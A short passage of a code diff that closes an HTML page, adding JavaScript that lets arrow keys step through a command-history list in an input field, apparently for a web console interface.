+    input.value = cmdHistory[cmdHistoryIdx];
+    input.setSelectionRange(input.value.length, input.value.length);
+  } else if (e.key === "ArrowDown") {
+    e.preventDefault();
+    cmdHistoryIdx = Math.max(cmdHistoryIdx - 1, -1);
+    input.value = cmdHistoryIdx >= 0 ? cmdHistory[cmdHistoryIdx] : "";
+    input.setSelectionRange(input.value.length, input.value.length);
+  }
+});
+</script>
+</body>
+</html>
